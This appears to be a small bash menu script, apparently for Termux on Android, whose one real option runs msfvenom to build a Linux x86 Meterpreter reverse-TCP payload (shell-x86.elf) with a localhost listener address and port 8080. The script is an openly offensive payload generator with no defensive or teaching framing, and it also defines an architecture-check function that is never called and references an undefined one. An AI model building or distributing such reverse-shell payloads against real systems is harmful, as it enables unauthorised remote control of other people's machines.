R="$(printf '\033[1;31m')"
G="$(printf '\033[1;32m')"
Y="$(printf '\033[1;33m')"
W="$(printf '\033[1;37m')"
C="$(printf '\033[1;36m')"

clear


figlet " Linux "


echo
echo " ${C}[1] linux/x86/meterpreter_reverse_tcp "
echo " [2] Exit "  ${W}
echo
read -p ${Y}"Select option: "${W} user_input
echo

get_arch() {
    printf ${G}"[*] Checking device architecture ..."${W}
    case $(getprop ro.product.cpu.abi) in
        arm64-v8a)
            SYS_ARCH=arm64
            ;;
        armeabi|armeabi-v7a)
            SYS_ARCH=armhf
            ;;
        *)
            unsupported_arch
            ;;
    esac
}

window_1() {
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf > shell-x86.elf

}

window_2() {
exit

}


if [[ $user_input == "1" ]]; then
        echo ${G}"[*] open ..." ${W}
        echo
window_1

elif [[ $user_input == "2" ]]; then
          echo ${G}"[*] exit ..." ${W}
          echo
window_2

else

echo ${R}"[*] Error, Select a option from the above list"${W}
echo

fi
